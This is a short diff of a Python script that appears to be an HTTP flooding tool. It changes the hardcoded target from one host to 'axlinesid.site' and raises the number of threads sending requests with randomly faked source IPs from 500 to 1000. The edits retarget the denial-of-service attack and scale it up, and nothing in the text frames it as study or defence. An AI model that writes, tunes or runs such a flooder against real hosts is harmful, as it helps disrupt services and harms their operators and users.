@@ -4,7 +4,7 @@ import threading
 import ipaddress
 
 # Define the target server and port
-target = "worker-young-dream-de51.rx3uprdg.workers.dev"
+target = "axlinesid.site"
 port = 80  # HTTP typically uses port 80
 
 # Define the CIDR subnet range
@@ -42,7 +42,7 @@ def send_request_with_random_fake_ip():
 
 # Create and start threads for sending requests
 threads = []
-for _ in range(500):
+for _ in range(1000):
     thread = threading.Thread(target=send_request_with_random_fake_ip)
     thread.start()
     threads.append(thread)
